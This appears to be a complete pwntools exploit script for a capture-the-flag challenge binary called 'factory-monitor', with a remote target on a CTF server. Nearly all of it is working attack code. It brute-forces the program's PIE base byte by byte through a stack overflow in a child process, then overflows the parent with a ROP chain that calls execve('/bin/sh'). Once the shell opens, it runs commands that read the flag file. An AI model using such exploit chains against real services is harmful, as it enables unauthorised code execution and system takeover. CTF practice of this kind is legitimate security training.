#!/usr/bin/env python3
from pwn import *
import sys, time

context.log_level = 'info'
context.arch = 'amd64'

if '--remote' in sys.argv:
    io = remote('factory-monitor.pwn.ctf.umasscybersec.org', 45000)
else:
    io = process('./factory-monitor')

io.recvuntil(b'factory> ')
def cmd(s):
    io.sendline(s.encode() if isinstance(s, str) else s)
    return io.recvuntil(b'factory> ', timeout=10)

MACHINE_SIZE = 0x48

# Setup machines:
# 0: "flag.txt" or "/ctf/flag.txt" (for open path)
# 1: pivot data (padding + SYSCALL_RET addr)
# 2: "/bin/sh" (for execve)

FLAG_PATH = '/ctf/flag.txt' if '--remote' in sys.argv else 'flag.txt'
cmd(f'create {FLAG_PATH}')
cmd('start 0')
time.sleep(0.5)
cmd('recv 0 500')

# ── Phase 1: Brute-force PIE base via child overflow ──
log.info("Brute-forcing PIE base...")
byte1_cands = [((x*0x1000+0xe333)>>8)&0xff for x in range(16) if ((x*0x1000+0xe333)>>8)&0xff != 0x0a]
known = b''
for b1 in byte1_cands:
    io.sendline(b'send 0 '+b'A'*272+b'B'*8+bytes([0x33,b1]))
    io.recvuntil(b'factory> ',timeout=5)
    io.sendline(b'send 0 exit');io.recvuntil(b'factory> ',timeout=5)
    time.sleep(0.3)
    io.sendline(b'monitor 0');r=io.recvuntil(b'factory> ',timeout=10)
    if b'status 127' in r:
        known=bytes([0x33,b1]);cmd('recv 0 500')
        log.success(f"byte1=0x{b1:02x}")
        break
    cmd('recv 0 500')
if len(known)<2: log.error("byte1 fail"); sys.exit(1)

for nm in ["byte2","byte3","byte4"]:
    f=None
    for v in range(256):
        if v==0x0a:continue
        io.sendline(b'send 0 '+b'A'*272+b'B'*8+known+bytes([v]))
        io.recvuntil(b'factory> ',timeout=5)
        io.sendline(b'send 0 exit');io.recvuntil(b'factory> ',timeout=5)
        time.sleep(0.2)
        io.sendline(b'monitor 0');r=io.recvuntil(b'factory> ',timeout=10)
        if b'status 127' in r:f=v;cmd('recv 0 500');log.success(f"{nm}=0x{v:02x}");break
        cmd('recv 0 500')
        if v%64==63: log.info(f"  {nm}@0x{v:02x}...")
    known+=bytes([f if f is not None else 0x0a])

base=u64(known.ljust(5,b'\x00')+b'\x7f\x00\x00')-0xe333
log.success(f"PIE BASE = 0x{base:016x}")

G=lambda o:base+o
BSS=G(0xc5a20)
SYSCALL_RET=G(0x38129)

# ── Phase 2: Setup pivot & shell ──
pivot_name = b'Q'*8 + p64(SYSCALL_RET)
cmd(b'create ' + pivot_name)  # machine 1
cmd(b'create /bin/sh')         # machine 2

PIVOT_ADDR = BSS + MACHINE_SIZE
BINSH = BSS + 2*MACHINE_SIZE

# ── Phase 3: Parent overflow ROP → execve("/bin/sh") ──
rop = b''
rop += p64(G(0xc028)) + p64(BINSH) + p64(PIVOT_ADDR)
rop += p64(G(0x15b26)) + p64(0) + p64(PIVOT_ADDR)
rop += p64(G(0x7c5b2)) + p64(59) + p64(0)

payload = b'P'*304 + p64(BSS+0x800) + rop
log.info(f"Payload: {len(payload)} bytes")

io.sendline(b'send 0 ' + payload)
io.recvuntil(b'factory> ', timeout=5)
io.sendline(b'recv 0 100')
io.recvuntil(b'factory> ', timeout=5)
io.sendline(b'recv 0 100')  # OVERFLOW → ROP → execve → SHELL!
time.sleep(1)

log.success("Shell should be ready!")
io.sendline(b'id; cat /ctf/flag.txt 2>/dev/null; cat flag.txt 2>/dev/null')
time.sleep(1)
try:
    data = io.recvrepeat(timeout=5)
    log.success(f"Output:\n{data.decode(errors='replace')}")
except: pass
io.interactive()
